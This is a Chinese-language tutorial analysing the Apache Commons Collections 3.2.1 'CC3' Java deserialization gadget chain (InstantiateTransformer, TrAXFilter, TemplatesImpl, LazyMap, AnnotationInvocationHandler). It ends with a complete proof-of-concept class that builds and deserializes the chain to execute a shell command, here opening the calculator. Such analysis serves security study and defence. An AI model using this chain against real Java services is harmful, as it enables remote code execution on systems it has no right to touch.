0x00 前言

CC指的是 Apache Commons Collections 库，该库是对 Java Collections 的一个扩展，旨在简化集合操作，并提供更强大和灵活的集合操作能力。可以通过maven等依赖管理工具引入该库，如：

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

本文 CC3 链指的是 InstantiateTransformer + TrAXFilter + TemplatesImpl 利用链，可以用于绕过 InvokerTransformer 类被禁用的情况。

0x01 漏洞链信息

1.1 利用限制

  • CC3 适用于 Apache Commons Collections 库 3.2 ~ 3.2.1 版本。
  • CC3 链适用于 JDK 1.7 ~ JDK 8

1.2 涉及的核心组件

组件类名功能/在利用链中承担的作用
TemplatesImpl执行者，执行任意代码
TrAXFilter触发点，触发执行器
InstantiateTransformer触发点，触发下一层触发点
LazyMap/TransformedMap触发点，触发下一层触发点
AnnotationInvocationHandler入口点，通过该类反序列化时的readObject方法引动触发点，触发利用链

0x02 漏洞分析

TemplatesImpl

作为前置知识，TemplatesImpl类可以动态加载和执行Java字节码，如果受控情况下构建TemplatesImpl实例并调用其newTransformer()方法，那么就可以执行任意代码。参考 TemplatesImpl恶意利用 。

TrAXFilter

InstantiateTransformer

public class InstantiateTransformer implements Transformer, Serializable {
   // ...

   public InstantiateTransformer(Class[] paramTypes, Object[] args) {
      this.iParamTypes = paramTypes;
      this.iArgs = args;
   }

   public Object transform(Object input) {
      try {
         if (!(input instanceof Class)) {
            throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
         } else {
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
         }
      } catch // ...
   }
}

以上可见，被创建实例的类对象由transform()方法参数指定，创建实例调用的目标对象构造方法及构造方法参数则在创建InstantiateTransformer实例时指定。所以我们可以借此构造一个上述的TrAXFilter类实例达到执行任意代码的目的。现在目标就回到了我们熟悉的想办法调用Transformer#transform()。

自动调用Transformer#transform()的触发点参考 java反序列化cc1链 ，这里不再重复。

public class CC3 {
    public static void main(String[] args) throws Exception {
        Templates templates = Gadgets.createTemplatesImpl("open -a Calculator");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(TrAXFilter.class), instantiateTransformer});

        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        lazyMap.get("b5juan");

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler handler_0 = (InvocationHandler) cons.newInstance(Generated.class, lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler_0);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Generated.class, mapProxy);

        // 序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.flush();
        oos.close();
        
        // 反序列化触发
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
